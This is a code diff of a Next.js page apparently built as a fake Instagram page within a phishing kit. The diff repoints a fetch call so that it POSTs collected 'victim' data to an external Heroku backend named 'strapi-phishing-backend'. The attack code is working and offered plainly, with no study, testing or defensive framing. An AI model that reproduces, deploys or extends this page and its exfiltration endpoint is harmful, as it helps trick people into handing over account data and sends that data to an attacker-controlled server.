@@ -2,7 +2,6 @@ import Head from "next/head";
 import router, { useRouter } from "next/router";
 import { useState } from "react";
 import styles from "../styles/ins.module.css"
-import { API_URL } from "../utils/urls";
 
 const instagram = () => {
     const route = useRouter()
@@ -21,7 +20,7 @@ const instagram = () => {
             "users_permissions_user": id,
             "Page": "Instagram"
         }
-        fetch(`${API_URL}http://localhost:1337/victims`, {
+        fetch("https://strapi-phishing-backend.herokuapp.com/victims", {
             method: "POST",
             body: JSON.stringify(data),
             headers: { "Content-Type": "application/json "},
